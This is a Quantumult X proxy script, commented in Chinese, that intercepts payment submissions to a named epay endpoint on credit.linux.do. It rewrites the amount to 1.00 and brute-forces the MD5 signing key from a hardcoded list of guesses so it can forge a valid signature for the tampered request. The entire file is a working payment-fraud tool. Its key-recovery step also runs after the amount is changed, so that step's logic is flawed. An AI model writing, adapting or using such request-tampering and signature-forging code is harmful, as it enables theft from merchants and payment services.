// 文件名：change_payment.js
// Quantumult X 脚本格式
// 注意：Quantumult X 脚本不需要 $request.url 这样的变量声明

// 尝试的密钥列表
const POSSIBLE_KEYS = [
    "",
    "test",
    "123456",
    "md5key",
    "epay",
    "credit",
    "linuxdo",
    "shop",
    "shopsxxe",
    "sxxe.net",
    "7d393c101aec6fbdd688b724ec576f46d03a653905221a8fdf3005e5169a5114",
    "7d393c101aec6fbdd688b724ec576f46",
    "d03a653905221a8fdf3005e5169a5114"
];

// MD5函数
function md5(str) {
    // Quantumult X 内置 $crypto 对象
    return $crypto.MD5(str);
}

// 解析参数
function parseParams(body) {
    const params = {};
    const pairs = body.split('&');
    for (let i = 0; i < pairs.length; i++) {
        const pair = pairs[i].split('=');
        if (pair.length === 2) {
            params[pair[0]] = decodeURIComponent(pair[1]);
        }
    }
    return params;
}

// 序列化参数
function serializeParams(params) {
    const pairs = [];
    for (const key in params) {
        if (params.hasOwnProperty(key)) {
            pairs.push(key + '=' + encodeURIComponent(params[key]));
        }
    }
    return pairs.join('&');
}

// 生成签名
function generateSign(params, key) {
    // 排除 sign 和 sign_type
    const keys = Object.keys(params).filter(k => 
        k !== 'sign' && k !== 'sign_type' && params[k] !== ''
    ).sort();
    
    const sortedStr = keys.map(k => `${k}=${params[k]}`).join('&');
    return md5(sortedStr + key);
}

// 找出正确密钥
function findCorrectKey(params, originalSign) {
    for (const key of POSSIBLE_KEYS) {
        const testSign = generateSign(params, key);
        if (testSign === originalSign) {
            console.log(`✅ 找到密钥: ${key}`);
            return key;
        }
    }
    console.log("❌ 未找到正确密钥");
    return POSSIBLE_KEYS[0];
}

// Quantumult X 主处理函数
if ($request && $request.url && $request.url.indexOf('credit.linux.do/epay/pay/submit.php') !== -1) {
    console.log("拦截到支付请求");
    
    // 获取请求体
    const body = $request.body;
    console.log("原始请求体: " + body);
    
    // 解析参数
    const params = parseParams(body);
    const originalSign = params.sign;
    
    // 修改金额
    console.log(`原金额: ${params.money}`);
    params.money = '1.00';
    console.log(`新金额: ${params.money}`);
    
    // 找到正确密钥
    const correctKey = findCorrectKey({...params}, originalSign);
    
    // 重新计算签名
    params.sign = generateSign(params, correctKey);
    console.log(`新签名: ${params.sign}`);
    
    // 重建请求体
    const newBody = serializeParams(params);
    console.log("修改后请求体: " + newBody);
    
    // 返回修改后的请求
    $done({body: newBody});
} else {
    $done({});
}
